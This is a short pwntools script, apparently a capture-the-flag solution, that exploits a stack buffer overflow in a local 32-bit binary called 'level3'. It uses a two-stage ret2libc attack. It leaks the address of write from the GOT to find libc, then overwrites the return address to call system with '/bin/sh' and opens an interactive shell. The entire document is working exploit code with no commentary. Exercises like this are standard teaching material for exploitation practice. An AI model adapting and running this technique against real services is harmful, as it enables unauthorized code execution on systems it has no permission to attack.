from pwn import *

io = process("./level3")
elf = ELF("level3")
libc = ELF("./libc.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]

payload1 = cyclic(0x88+4) + p32(write_plt) + p32(0x0804844B) + p32(1) + p32(write_got) +p32(8)
io.recv()
io.send(payload1)   
write_addr = u32(io.recv(4))

write_libc = libc.symbols["write"]
offset = write_addr - write_libc

sys_addr = offset + libc.symbols["system"]

binsh = offset + next(libc.search(b'/bin/sh'))

payload2 = cyclic(0x88+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh)

io.send(payload2)
io.interactive()